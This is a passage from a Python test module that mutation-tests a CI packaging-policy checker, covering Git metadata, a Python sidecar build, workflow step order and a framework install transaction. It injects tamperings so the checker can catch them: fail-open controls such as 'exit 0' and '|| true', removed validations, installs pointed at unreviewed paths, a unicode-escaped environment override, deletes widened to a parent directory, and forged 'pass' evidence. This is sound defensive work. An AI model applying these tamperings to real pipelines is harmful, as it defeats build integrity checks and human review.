                'git("config", "--local", "gc.auto", "1")',
                'git("config", "--local", "gc.auto", "0")',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "hostile local Git metadata" in error
                        or "raw Git index/worktree" in error
                        or "beforePack tests" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_python_repository_gate_keeps_held_repository_bindings(self) -> None:
        mutations = (
            (
                "                git_descriptor=git_descriptor,\n",
                "                git_descriptor=None,\n",
            ),
            (
                "            repository_descriptor=repository_descriptor,\n"
                "            git_descriptor=git_descriptor,\n"
                "        )\n"
                "        _validate_git_info_overrides",
                "            repository_descriptor=repository_descriptor,\n"
                "            git_descriptor=None,\n"
                "        )\n"
                "        _validate_git_info_overrides",
            ),
            (
                "            git_descriptor=git_descriptor,\n"
                "        )\n"
                "        _validate_tracked_worktree",
                "            git_descriptor=None,\n"
                "        )\n"
                "        _validate_tracked_worktree",
            ),
            (
                '            "--untracked-files=all",\n',
                '            "--untracked-files=no",\n',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "build_script", old, new)
                with synchronized_input_document_summaries(current, "build_script"):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "Python sidecar exact repository gate is not descriptor-bound",
                    errors,
                )

    def test_toolchain_children_keep_private_epoch_path_bindings(self) -> None:
        mutations = (
            (
                "                    (cache_fd, str(cache_root), False),\n",
                "                    # cache epoch binding removed\n",
            ),
            (
                "                    path_capabilities=toolchain_path_capabilities,\n",
                "                    path_capabilities=(),\n",
            ),
            (
                "                        path_capabilities=distribution_path_capabilities,\n",
                "                        path_capabilities=(),\n",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "python_bootstrap", old, new)
                with synchronized_input_document_summaries(
                    current,
                    "python_bootstrap",
                ):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "exact Python toolchain bootstrap/seal closure drifted",
                    errors,
                )

    def test_frozen_sidecar_log_cannot_bypass_its_bounded_owner(self) -> None:
        mutations = (
            (
                "                    stdout=subprocess.PIPE,\n"
                "                    stderr=subprocess.STDOUT,\n",
                "                    stdout=log_handle,\n"
                "                    stderr=subprocess.STDOUT,\n",
            ),
            (
                "            log_collector.start()\n",
                "            # collector disabled\n",
            ),
            (
                "            log_collector.finish()\n",
                "            log_collector.assert_healthy()\n",
            ),
            (
                "test_frozen_live_log_collector_bounds_output_before_owner_cleanup",
                "test_frozen_log_is_not_bounded",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                key = (
                    "python_packaging_tests"
                    if old.startswith("test_frozen")
                    else "build_script"
                )
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "bounded log owner" in error
                        or "bounded log owner lifecycle" in error
                        or "output bypasses" in error
                        or "candidate capability tests" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_python_candidate_capability_spans_producer_consumers_and_publish(self) -> None:
        mutations = (
            (
                "build_script",
                "def _verify_held_bundle_candidate(\n",
                "def _ignore_held_bundle_candidate(\n",
            ),
            (
                "build_script",
                "        bundle_capability = _create_bundle_capability(\n",
                "        bundle_capability = None  # capability removed\n",
            ),
            (
                "build_script",
                "            bundle_descriptor=bundle_capability.descriptor,\n",
                "            bundle_descriptor=None,\n",
            ),
            (
                "build_script",
                "        _validate_bundle_capability(\n"
                "            scratch,\n"
                '            error_message="Python sidecar bundle changed during frozen smoke",\n'
                "        )\n",
                "        pass\n",
            ),
            (
                "build_script",
                "        _publish_owned_bundle(\n",
                "        publish_staging(\n",
            ),
            (
                "build_script",
                "        def final_verifier(candidate: Path) -> dict[str, int]:\n",
                "        def final_verifier(_candidate: Path) -> dict[str, int]:\n",
            ),
            (
                "build_script",
                "            result = audit.audit_bundle(\n"
                "                candidate,\n",
                "            result = audit.audit_bundle(\n"
                "                bundle_capability.path,\n",
            ),
            (
                "build_script",
                "                native_scanner=lambda native_root: "
                "audit.scan_macho_inventory(\n"
                "                    native_root,\n"
                "                    root_descriptor=bundle_capability.descriptor,\n"
                "                ),\n",
                "                native_scanner=audit.scan_macho_inventory,\n",
            ),
            (
                "build_script",
                "            os.close(bundle.descriptor)\n",
                "            pass  # held bundle descriptor leaked\n",
            ),
            (
                "build_script",
                "        _bundle_capability_path(bundle)\n"
                "        _validate_source_snapshot(scratch)\n"
                "        # Ownership transfers only after every fallible acquisition check.\n"
                "        # Before this assignment the caller remains the sole fd owner.\n"
                "        scratch.bundle = bundle\n",
                "        scratch.bundle = bundle\n"
                "        _bundle_capability_path(bundle)\n"
                "        _validate_source_snapshot(scratch)\n",
            ),
            (
                "python_packaging_tests",
                "test_bundle_capability_precedes_producer_and_fd_consumers_ignore_root_aba",
                "test_pathname_consumers_ignore_root_aba",
            ),
            (
                "python_packaging_tests",
                "test_pyinstaller_runner_validates_canonical_roots_and_closes_child_fds",
                "test_pyinstaller_runner_ignores_canonical_roots_and_leaks_child_fds",
            ),
            (
                "python_packaging_tests",
                "test_final_bundle_verifier_binds_pre_and_post_publish_candidate_paths",
                "test_final_bundle_verifier_ignores_publish_candidate_paths",
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "candidate capability" in error
                        or "pre-producer capability" in error
                        or "producer capability" in error
                        or "held candidate" in error
                        or "candidate ownership" in error
                        or "grandchild capability" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        build_script = str(current["build_script"])
        frozen = "frozen_smoke = run_frozen_smoke("
        components = "components = build_components("
        self.assertIn(frozen, build_script)
        self.assertIn(components, build_script)
        build_script = build_script.replace(frozen, "__LCF_ORDER_SWAP__", 1)
        build_script = build_script.replace(components, frozen, 1)
        build_script = build_script.replace("__LCF_ORDER_SWAP__", components, 1)
        current["build_script"] = build_script
        with synchronized_input_document_summaries(current, "build_script"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "Python sidecar held candidate producer/consumer/publish chain drifted",
            errors,
        )

        current = inputs()
        changed_last(
            current,
            "build_script",
            "            _verify_held_bundle_candidate(\n"
            "                bundle_capability,\n"
            "                candidate,\n",
            "            _verify_held_bundle_candidate(\n"
            "                bundle_capability,\n"
            "                bundle_capability.path,\n",
        )
        with synchronized_input_document_summaries(current, "build_script"):
            errors = CHECKER.validate_policy(current)
        self.assertIn(
            "Python sidecar held candidate producer/consumer/publish chain drifted",
            errors,
        )

    def test_reviewed_desktop_package_producer_consumer_chain_is_semantic(self) -> None:
        mutations = (
            (
                "prepare",
                "const packageMetadata = loadReviewedDesktopPackageMetadata(source);",
                'const packageMetadata = loadJson(PACKAGE_PATH, "Desktop package metadata");',
            ),
            (
                "prepare",
                "readReviewedGitBlob(repositoryRoot, desktopPackage.objectId)",
                "fs.readFileSync(path.join(repositoryRoot, DESKTOP_PACKAGE_PATH))",
            ),
            (
                "prepare",
                '        "desktopPackageSha256"',
                '        "desktopPackageDigest"',
            ),
            (
                "common_audit",
                '      "reviewedPackageSha256",\n',
                "",
            ),
            (
                "before_pack",
                "desktopApp.reviewedPackageSha256 !== source.desktopPackageSha256",
                "false",
            ),
            (
                "bundle_audit",
                "manifest.components.desktopApp.reviewedPackageSha256 !==",
                "false &&",
            ),
            (
                "engineering_packaging_tests",
                '"9.9.9-transient"',
                '"0.0.0"',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "reviewed Desktop package chain" in error
                        or "engineering packaging tests" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        schema = copy.deepcopy(current["schema"])
        desktop_app = schema["properties"]["components"]["properties"][
            "desktopApp"
        ]
        desktop_app["required"].remove("reviewedPackageSha256")
        current["schema"] = schema
        with synchronized_input_document_summaries(current, "schema"):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("schema required properties" in error for error in errors))

    def test_standalone_python_auditor_reuses_hostile_git_boundary(self) -> None:
        mutations = (
            (
                "audit_script",
                '        expected_module = TOOLS_ROOT / "build_python_sidecar.py"\n',
                '        expected_module = Path("build_python_sidecar.py")\n',
            ),
            (
                "audit_script",
                "            build._validate_local_git_configuration(\n"
                "                repository_root=repository_root,\n"
                "                repository_descriptor=repository_descriptor,\n"
                "                git_descriptor=git_descriptor,\n"
                "            )\n",
                "            pass  # local Git validation removed\n",
            ),
            (
                "audit_script",
                "            build._validate_git_info_overrides(repository_root=repository_root)\n",
                "            pass  # info override validation removed\n",
            ),
            (
                "audit_script",
                "        with _held_git_boundary(repository_root) as (\n",
                "        with _unheld_git_boundary(repository_root) as (\n",
            ),
            (
                "audit_script",
                "                return build._git_bytes(\n"
                "                    *arguments,\n"
                "                    repository_root=repository_root,\n"
                "                    repository_descriptor=repository_descriptor,\n"
                "                    git_descriptor=git_descriptor,\n"
                "                )\n",
                "                return build._git_bytes(\n"
                "                    *arguments,\n"
                "                    repository_root=repository_root,\n"
                "                    repository_descriptor=repository_descriptor,\n"
                "                    git_descriptor=None,\n"
                "                )\n",
            ),
            (
                "audit_script",
                "        verified = _reviewed_build_boundary()._validate_repository_state(\n",
                "        verified = _reviewed_build_boundary()._repository_tree_inventory(\n",
            ),
            (
                "python_packaging_tests",
                '@pytest.mark.parametrize("mutation", ["filter", "index-flag", "info-attributes"])',
                '@pytest.mark.parametrize("mutation", ["filter"])',
            ),
        )
        for key, old, new in mutations:
            with self.subTest(key=key, old=old):
                current = inputs()
                changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "standalone Python auditor" in error
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        package = copy.deepcopy(current["package"])
        package["scripts"]["audit:python-sidecar"] = (
            "python ../tools/audit_python_sidecar.py --bundle generated/sidecar"
        )
        current["package"] = package
        with synchronized_input_document_summaries(current, "package"):
            errors = CHECKER.validate_policy(current)
        self.assertIn("Desktop standalone Python auditor script drifted", errors)

        current = inputs()
        audit_run = (
            "          run_exact_npm_script desktop test\n"
            "          run_exact_npm_script desktop typecheck\n"
            "          node tools/exact_node_install.cjs discard-test"
        )
        changed(
            current,
            "formal_workflow",
            audit_run,
            "          run_exact_npm_script desktop typecheck\n"
            "          run_exact_npm_script desktop test\n"
            "          node tools/exact_node_install.cjs discard-test",
        )
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "formal workflow" in error
                or "formal exact Desktop" in error
                for error in errors
            ),
            errors,
        )

    def test_artifact_cache_release_and_app_launch_surfaces_fail(self) -> None:
        additions = (
            "      - uses: actions/upload-artifact@" + "a" * 40 + "\n",
            "      - uses: actions/cache@" + "a" * 40 + "\n",
            "      - run: gh release create v0.0.0\n",
            "      - run: /usr/bin/open 'release-smoke/App.app'\n",
            "      - run: release-smoke/App.app/Contents/MacOS/App\n",
            "      - run: spctl --assess release-smoke/App.app\n",
        )
        for addition in additions:
            with self.subTest(addition=addition.strip()):
                current = inputs()
                current["workflow"] = str(current["workflow"]) + addition
                self.assertTrue(CHECKER.validate_policy(current))

    def test_governance_threat_boundary_and_formal_scope_are_semantic(self) -> None:
        for key, old, new in (
            (
                "trace",
                "不触发 formal Draft/promotion/publish",
                "formal release path unchanged",
            ),
            (
                "todo",
                "在 distribution/publish semantics 上与 formal release\n   隔离",
                "与 formal release 严格隔离",
            ),
            (
                "iteration",
                "shared exact provenance/build boundary",
                "legacy source staging only",
            ),
            (
                "iteration",
                "tools/{check_exact_git_provenance.py,exact_node_install.cjs,generate_reviewed_python_framework_inventory.cjs,verify_reviewed_python_framework.cjs,bootstrap_python_sidecar.py,build_python_sidecar.py,audit_python_sidecar.py}",
                "tools/build_python_sidecar.py",
            ),
            (
                "remediation_evidence",
                "process-level build CLI lifecycle",
                "arbitrary same-process retry is supported",
            ),
            (
                "remediation_evidence",
                "server-reviewed workflow 与 system Git/runtime",
                "repo-owned checker is the complete bootstrap TCB",
            ),
            (
                "remediation_evidence",
                "`python-sidecar-toolchain-*` 与 `lcf-python-installer.*`",
                "one unbounded scratch prefix",
            ),
            (
                "remediation_evidence",
                "cleanup-only `always()` gate",
                "combined provenance and cleanup gate",
            ),
            (
                "iteration",
                "首个 post-build cleanup-only `always()` gate",
                "final combined validation",
            ),
            (
                "remediation_evidence",
                "最后一个 repo-code step",
                "tests run before production build",
            ),
            (
                "remediation_evidence",
                "container-run=31454826243,result=fail -->",
                "container-run=31454826243,result=pass -->",
            ),
            (
                "remediation_evidence",
                "## 第六次 remediation technical candidate：`not-run`",
                "## 第六次 remediation technical candidate：`pass`",
            ),
            (
                "remediation_evidence",
                "这是高置信代码/时序归因，不是 raw log 直接输出的",
                "这是 Actions raw log 直接证明的",
            ),
            (
                "status",
                "twelfth local candidate `not-run`",
                "twelfth local candidate `pass`",
            ),
            (
                "trace",
                "first through eleventh remediations failed and superseded",
                "first through tenth remediations failed and superseded",
            ),
            (
                "todo",
                "eleven remediation attempts `fail` / `superseded`",
                "ten remediation attempts `fail` / `superseded`",
            ),
            (
                "iteration",
                "第十二次 local candidate `not-run`",
                "第十二次 local candidate `pass`",
            ),
            (
                "iteration",
                "PYTHONDONTWRITEBYTECODE=1",
                "PYTHONDONTWRITEBYTECODE=0",
            ),
        ):
            with self.subTest(key=key, old=old):
                current = inputs()
                if key in {"remediation_evidence", "status"}:
                    # Append-only evidence can repeat a historical boundary.
                    # Remove every copy so the mutation proves current
                    # authority is not satisfied by a stale earlier section.
                    changed_all(current, key, old, new)
                else:
                    changed(current, key, old, new)
                with synchronized_input_document_summaries(current, key):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "governance" in error
                        or "owned-path" in error
                        or "remediation evidence" in error
                        for error in errors
                    ),
                    errors,
                )

    def test_python_source_urls_and_digests_are_locked(self) -> None:
        current = inputs()
        changed(current, "workflow", CHECKER.PYTHON_ARCHIVE_SHA256, "0" * 64)
        self.assertTrue(any("Python source lock" in error for error in CHECKER.validate_policy(current)))

    def test_python_runner_inputs_are_persisted_after_source_verification(self) -> None:
        mutations = (
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_archive}\"\n",
                "",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_hashes}\"\n",
                "",
            ),
            (
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n',
                "",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_archive}\"",
                "printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' \"${python_hashes}\"",
            ),
            (
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_hashes}\"",
                "printf 'LCF_PYTHON_DISTRIBUTION_HASH_MANIFEST=%s\\n' \"${python_archive}\"",
            ),
            (
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n',
                "printf 'LCF_PYTHON_INSTALL_ROOT=%s\\n' \\\n"
                '              "/Library/Frameworks/Python.framework/Versions/3.12"\n',
            ),
            (
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n'
                '          } >> "${GITHUB_ENV}"',
                '              "/Library/Frameworks/Python.framework/Versions/3.13"\n'
                '          } >> "${GITHUB_OUTPUT}"',
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                self.assertIn(
                    "workflow Python runner input binding drifted",
                    CHECKER.validate_policy(current),
                )

        current = inputs()
        binding = (
            "            printf 'LCF_PYTHON_DISTRIBUTION_ARCHIVE=%s\\n' "
            '"${python_archive}"'
        )
        changed(current, "workflow", binding, f"{binding}\n{binding}")
        self.assertIn(
            "workflow Python runner input binding drifted",
            CHECKER.validate_policy(current),
        )

        overrides = (
            (
                "      LCF_GITHUB_CONTEXT_SHA: ${{ github.sha }}",
                "      LCF_GITHUB_CONTEXT_SHA: ${{ github.sha }}\n"
                "      LCF_PYTHON_INSTALL_ROOT: /tmp/unreviewed",
            ),
            (
                "      - name: Assemble and statically audit app directory",
                "      - name: Assemble and statically audit app directory\n"
                "        env:\n"
                "          LCF_PYTHON_DISTRIBUTION_ARCHIVE: /tmp/unreviewed",
            ),
        )
        for old, new in overrides:
            with self.subTest(override=new):
                current = inputs()
                changed(current, "workflow", old, new)
                errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow Python runner input binding drifted",
                    errors,
                )
                if "\n        env:" in new:
                    self.assertIn("workflow environment surface drifted", errors)

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Assemble and statically audit app directory",
            "      - name: Assemble and statically audit app directory\n"
            '        "env":\n'
            '          "LCF_PYTHON\\u005fINSTALL_ROOT": /tmp/unreviewed',
        )
        self.assertIn(
            "workflow document contract drifted",
            CHECKER.validate_policy(current),
        )

    def test_required_commands_cannot_be_satisfied_by_comments(self) -> None:
        current = inputs()
        changed(
            current,
            "workflow",
            '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
            "        run: |\n"
            '          cd "${LCF_REVIEWED_SOURCE_ROOT}"\n'
            "          # make python-sidecar-build\n"
            "          true",
        )
        errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("run-step contract" in error or "required command" in error for error in errors)
        )

    def test_workflow_lifecycle_order_and_calls_survive_synchronized_hashes(self) -> None:
        mutations = (
            (
                "      - name: Enforce engineering-smoke packaging policy",
                "      - name: TEMP lifecycle step",
            ),
            (
                "          backend/.venv/bin/python -B -m pytest -q \\",
                "          true",
            ),
            (
                "          export PYTHONDONTWRITEBYTECODE=1",
                "          export PYTHONDONTWRITEBYTECODE=0",
            ),
            (
                '            "${LCF_REVIEWED_BUILD_PYTHON}" -I -S -m venv \\',
                '            "${LCF_REVIEWED_BUILD_PYTHON}" -I -m venv \\',
            ),
            (
                "            --require-hashes \\",
                "            --no-warn-script-location \\",
            ),
            (
                '        run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
                "        run: true",
            ),
            (
                "          test ! -L desktop/generated/python-sidecar-build",
                "          true",
            ),
            (
                '          test "${#repo_random_residue[@]}" -eq 0',
                "          true",
            ),
            (
                "          run_exact_npm_script web build:packaging",
                "          true",
            ),
        )
        for old, new in mutations:
            with self.subTest(old=old):
                current = inputs()
                changed(current, "workflow", old, new)
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertTrue(
                    any(
                        "step" in error.lower()
                        or "lifecycle" in error.lower()
                        or "required command" in error.lower()
                        or "renderer" in error.lower()
                        for error in errors
                    ),
                    errors,
                )

        current = inputs()
        workflow = str(current["workflow"])
        workflow = workflow.replace(
            "Enforce engineering-smoke packaging policy",
            "TEMP workflow step",
            1,
        ).replace(
            "Run focused Python sidecar lifecycle tests",
            "Enforce engineering-smoke packaging policy",
            1,
        ).replace(
            "TEMP workflow step",
            "Run focused Python sidecar lifecycle tests",
            1,
        )
        current["workflow"] = workflow
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertIn("workflow step order or step universe drifted", errors)

        current = inputs()
        current["workflow"] = str(current["workflow"]) + (
            "\n      - name: Unreviewed post-test Python consumer\n"
            "        run: python tools/build_python_sidecar.py --help\n"
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any(
                "final repo-code step" in error
                or "step order or step universe" in error
                for error in errors
            ),
            errors,
        )

        current = inputs()
        workflow = str(current["workflow"])
        workflow = workflow.replace(
            "run_exact_npm_script web typecheck",
            "__LCF_RENDERER_ORDER_SWAP__",
            1,
        ).replace(
            "run_exact_npm_script web build:packaging",
            "run_exact_npm_script web typecheck",
            1,
        ).replace(
            "__LCF_RENDERER_ORDER_SWAP__",
            "run_exact_npm_script web build:packaging",
            1,
        )
        current["workflow"] = workflow
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertIn("workflow exact renderer install/build/stage order drifted", errors)

    def test_workflow_fail_open_controls_survive_synchronized_hashes(self) -> None:
        controls = (
            "exit 0",
            "return 0",
            "make packaged-smoke-policy-check || true",
            "if false; then make packaged-smoke-policy-check; fi",
            "make packaged-smoke-policy-check &",
        )
        for control in controls:
            with self.subTest(control=control):
                current = inputs()
                original_run = CHECKER.EXPECTED_POLICY_RUN
                mutated_run = original_run.replace(
                    'cd "${LCF_REVIEWED_SOURCE_ROOT}"\n',
                    'cd "${LCF_REVIEWED_SOURCE_ROOT}"\n' + control + "\n",
                    1,
                )
                changed(
                    current,
                    "workflow",
                    textwrap.indent(original_run, "          "),
                    textwrap.indent(mutated_run, "          "),
                )
                with synchronized_workflow_summary(current):
                    errors = CHECKER.validate_policy(current)
                self.assertIn(
                    "workflow executable run steps contain a fail-open control",
                    errors,
                )

        current = inputs()
        changed(
            current,
            "workflow",
            "      - name: Build and audit locked Python sidecar",
            "      - name: Build and audit locked Python sidecar\n"
            "        continue-on-error: true",
        )
        with synchronized_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(any("continue-on-error" in error for error in errors), errors)

    def test_reviewed_framework_transaction_is_synchronized_and_fail_closed(
        self,
    ) -> None:
        current = inputs()
        step_names = (
            "Provision reviewed build Python without executing it",
            "Seal reviewed build Python framework",
            "Validate reviewed Python framework transaction postcondition",
        )
        runs_by_workflow: list[tuple[str, str, str]] = []
        for key, job in (("workflow", "assemble"), ("formal_workflow", "build")):
            steps = CHECKER._workflow_steps(str(current[key]), job)
            by_name = {step["name"]: step for step in steps}
            runs = tuple(by_name[name]["run"] for name in step_names)
            runs_by_workflow.append(runs)
            self.assertIn("id: provision_reviewed_python", by_name[step_names[0]]["document"])
            self.assertIn("id: seal_reviewed_python", by_name[step_names[1]]["document"])
            postcondition_document = by_name[step_names[2]]["document"]
            self.assertEqual(postcondition_document.count("if: ${{ always() }}"), 1)
            self.assertNotIn("continue-on-error:", postcondition_document)
            self.assertIn("steps.provision_reviewed_python.outcome", postcondition_document)
            self.assertIn("steps.seal_reviewed_python.outcome", postcondition_document)

        self.assertEqual(runs_by_workflow[0], runs_by_workflow[1])
        producer, seal, postcondition = runs_by_workflow[0]
        self.assertTrue(CHECKER._workflow_python_producer_is_semantic(producer))
        self.assertTrue(CHECKER._workflow_python_seal_is_semantic(seal))
        self.assertTrue(CHECKER._workflow_held_framework_loader_is_semantic(seal))
        self.assertTrue(
            CHECKER._workflow_framework_postcondition_is_semantic(postcondition)
        )

        for block in (producer, seal, postcondition):
            for signal in ("HUP", "INT", "TERM"):
                self.assertIn(signal, block)
            self.assertNotIn("rm -rf", block)
            self.assertNotIn('find -P -x "${framework_parent}"', block)
        for marker in (
            "LCF_REVIEWED_FRAMEWORK_INITIAL_STATE",
            "LCF_REVIEWED_FRAMEWORK_PREVIOUS_IDENTITY",
            "LCF_REVIEWED_FRAMEWORK_CANDIDATE_IDENTITY",
            "LCF_REVIEWED_FRAMEWORK_QUARANTINE_IDENTITY",
            "cleanup=failed",
            "exit 70",
        ):
            self.assertIn(marker, producer)
            self.assertIn(marker, postcondition)
        self.assertIn("cleanup=failed", seal)
        self.assertIn("exit 70", seal)
        self.assertNotIn('"${seal_quarantine}" -depth -delete', seal)
        self.assertNotIn(
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=complete",
            seal,
        )
        seal_signal_mask = seal.rindex("trap '' HUP INT TERM")
        seal_commit_journal = seal.index(
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=committed",
            seal_signal_mask,
        )
        seal_exit_handoff = seal.index("trap - EXIT", seal_commit_journal)
        seal_local_commit = seal.index(
            'seal_transaction_phase="committed"',
            seal_exit_handoff,
        )
        self.assertLess(
            seal_signal_mask,
            seal_commit_journal,
        )
        self.assertLess(seal_commit_journal, seal_exit_handoff)
        self.assertLess(seal_exit_handoff, seal_local_commit)
        for marker in (
            "finish_postcondition_failure() {",
            "handle_verification_failure() {",
            'finish_postcondition_failure verification "${verification_status}"',
            "finish_postcondition_failure successful-steps-rolled-back 1",
            "cleanup=complete",
            'case "${transaction_phase:-unvalidated}:${postcondition_phase:-unarmed}" in',
            "pending:pending|rolled-back:rolled-back|committed:committed)",
            "trap 'handle_postcondition_signal HUP 129' HUP",
            "trap 'handle_postcondition_signal INT 130' INT",
            "trap 'handle_postcondition_signal TERM 143' TERM",
            'postcondition_phase="finalizing"',
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=finalizing",
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=complete",
        ):
            self.assertIn(marker, postcondition)
        verifier = postcondition.index("verifier.verifyReviewedPythonFramework({")
        identity_recheck = postcondition.index(
            "trap 'fail_postcondition identity-mismatch' ERR"
        )
        finalizing_signal_mask = postcondition.rindex(
            "trap '' HUP INT TERM",
            0,
            postcondition.index('postcondition_phase="finalizing"'),
        )
        finalizing = postcondition.index('postcondition_phase="finalizing"')
        finalizing_failure_trap = postcondition.index(
            "trap 'fail_postcondition finalizing' ERR",
            finalizing,
        )
        quarantine_delete = postcondition.index(
            '"${framework_quarantine}" -depth -delete'
        )
        complete = postcondition.index(
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=complete"
        )
        self.assertLess(verifier, identity_recheck)
        self.assertLess(identity_recheck, finalizing)
        self.assertLess(finalizing_signal_mask, finalizing)
        self.assertLess(finalizing, finalizing_failure_trap)
        self.assertLess(finalizing, quarantine_delete)
        self.assertLess(quarantine_delete, complete)
        self.assertNotIn(
            "restore_initial_state",
            postcondition[finalizing:complete],
        )

        semantic_mutations = (
            (
                CHECKER._workflow_python_producer_is_semantic,
                producer,
                "trap 'handle_producer_signal TERM 143' TERM",
                "true",
            ),
            (
                CHECKER._workflow_python_producer_is_semantic,
                producer,
                "exit 70",
                'exit "${saved_status}"',
            ),
            (
                CHECKER._workflow_python_seal_is_semantic,
                seal,
                "trap 'handle_seal_signal INT 130' INT",
                "true",
            ),
            (
                CHECKER._workflow_python_seal_is_semantic,
                seal,
                '"${seal_installed_root_identity}"',
                '"${framework_parent}"',
            ),
            (
                CHECKER._workflow_python_seal_is_semantic,
                seal,
                CHECKER.EXPECTED_FRAMEWORK_SEAL_TRANSACTION_COMMIT,
                CHECKER.EXPECTED_FRAMEWORK_SEAL_TRANSACTION_COMMIT.replace(
                    "trap '' HUP INT TERM\n",
                    "",
                    1,
                )
                + "\ntrap '' HUP INT TERM",
            ),
            (
                CHECKER._workflow_framework_postcondition_is_semantic,
                postcondition,
                '"${framework_root}" -depth -delete',
                '"${framework_parent}" -depth -delete',
            ),
            (
                CHECKER._workflow_framework_postcondition_is_semantic,
                postcondition,
                '"${framework_quarantine}" -depth -delete',
                '"${framework_parent}" -depth -delete',
            ),
            (
                CHECKER._workflow_framework_postcondition_is_semantic,
                postcondition,
                'finish_postcondition_failure verification "${verification_status}"',
                'fail_postcondition verification',
            ),
            (
                CHECKER._workflow_framework_postcondition_is_semantic,
                postcondition,
                'postcondition_phase="finalizing"',
                'postcondition_phase="complete"',
            ),
            (
                CHECKER._workflow_framework_postcondition_is_semantic,
                postcondition,
                "pending:pending|rolled-back:rolled-back|committed:committed)",
                "committed:committed)",
            ),
            (
                CHECKER._workflow_framework_postcondition_is_semantic,
                postcondition,
                "trap '' HUP INT TERM\n  postcondition_phase=\"finalizing\"",
                "postcondition_phase=\"finalizing\"\n  trap '' HUP INT TERM",
            ),
        )
        for semantic, block, old, new in semantic_mutations:
            with self.subTest(mutation=old):
                self.assertIn(old, block)
                self.assertFalse(semantic(block.replace(old, new, 1)))

        current = inputs()
        changed(
            current,
            "formal_workflow",
            "      - name: Seal reviewed build Python framework",
            "      - name: Seal reviewed build Python framework\n"
            "        continue-on-error: true",
        )
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertIn("formal workflow must not use continue-on-error", errors)

        current = inputs()
        changed(
            current,
            "formal_workflow",
            'run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build',
            'run: cd "${LCF_REVIEWED_SOURCE_ROOT}" && make python-sidecar-build '
            "&& make packaged-smoke-policy-check",
        )
        with synchronized_formal_workflow_summary(current):
            errors = CHECKER.validate_policy(current)
        self.assertTrue(
            any("must not reference the engineering boundary" in error for error in errors),
            errors,
        )

    def test_reviewed_framework_workflow_producer_is_semantic(self) -> None:
        current = inputs()
        runs = [
            next(
                step["run"]
                for step in CHECKER._workflow_steps(str(current[key]), job)
                if step["name"]
                == "Provision reviewed build Python without executing it"
            )
            for key, job in (("workflow", "assemble"), ("formal_workflow", "build"))
        ]
        self.assertEqual(runs[0], runs[1])
        producer = runs[0]
        self.assertTrue(CHECKER._workflow_python_producer_is_semantic(producer))
        for marker in (
            'framework_initial_state="present"',
            'framework_initial_state="absent"',
            "LCF_REVIEWED_FRAMEWORK_PREVIOUS_IDENTITY",
            "LCF_REVIEWED_FRAMEWORK_CANDIDATE_IDENTITY",
            "LCF_REVIEWED_FRAMEWORK_QUARANTINE_IDENTITY",
            "LCF_REVIEWED_FRAMEWORK_TRANSACTION_PHASE=pending",
